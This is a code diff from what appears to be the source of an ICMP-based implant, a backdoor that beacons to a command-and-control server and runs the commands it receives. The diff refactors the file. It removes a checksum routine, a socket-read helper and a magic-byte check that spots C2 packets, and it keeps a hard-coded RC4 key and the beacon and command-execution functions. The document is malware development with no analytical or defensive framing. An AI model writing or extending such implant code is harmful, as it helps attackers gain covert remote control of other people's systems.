@@ -4,7 +4,7 @@
 #include <unistd.h>
 
 #include "../include/implant.h"
-#include "../include/rc4.h"
+#include "../include/utils.h"
 
 #define KEY "thisisapassword"
 #define KEY_LENGTH 15
@@ -20,30 +20,6 @@ int create_socket(void) {
     }
 
     return sockfd;
-}
-
-// calculates checksum (proudly? stolen from the internet)
-unsigned short cksum(unsigned short *addr, int len) {
-    int nleft = len;
-    int sum = 0;
-    unsigned short *w = addr;
-    unsigned short answer = 0;
-
-    while (nleft > 1) {
-      sum += *w++;
-      nleft -= 2;
-    }
-
-    if (nleft == 1) {
-      *(unsigned char *)(&answer) = *(unsigned char *)w;
-      sum += answer;
-    }
-
-    sum = (sum >> 16) + (sum & 0xffff);
-    sum += (sum >> 16);
-    answer = ~sum;
-
-    return answer;
 }
 
 // runs the command from the C2 and stores it in output, and returns the output size
@@ -85,17 +61,6 @@ size_t invoke_command(unsigned char *data, unsigned char *output) {
     return temp_buffer_size;
 }
 
-// reads from the socket and put it in the buffer
-ssize_t read_from_socket(int sockfd, unsigned char *buffer, size_t size) {
-    ssize_t nbytes = read(sockfd, buffer, size);
-
-    if (nbytes < 0) {
-        return -1;
-    }
-
-    return nbytes;
-}
-
 // sends a beacon to the C2 with the magic byte
 int send_beacon(int sockfd, char *dst_ip) {
     char *packet;
@@ -105,7 +70,7 @@ int send_beacon(int sockfd, char *dst_ip) {
     size_t packet_size = sizeof(struct icmphdr *);
 
     packet = malloc(sizeof(unsigned char) * packet_size);
-    CHECK_ALLOC(packet)
+    CHECK_ALLOC(packet);
 
     // setting the IP options
     dst.sin_family = AF_INET;
@@ -129,16 +94,6 @@ int send_beacon(int sockfd, char *dst_ip) {
     free(packet);
 
     return 1;
-}
-
-// check if we got an actual connection from our C2
-int check_magic_byte(struct icmphdr *icmp) {
-
-    if (icmp->type == 8 && icmp->un.echo.id == 9001) {
-        return 1;
-    }
-
-    return 0;
 }
 
 // the actual interaction occurs here
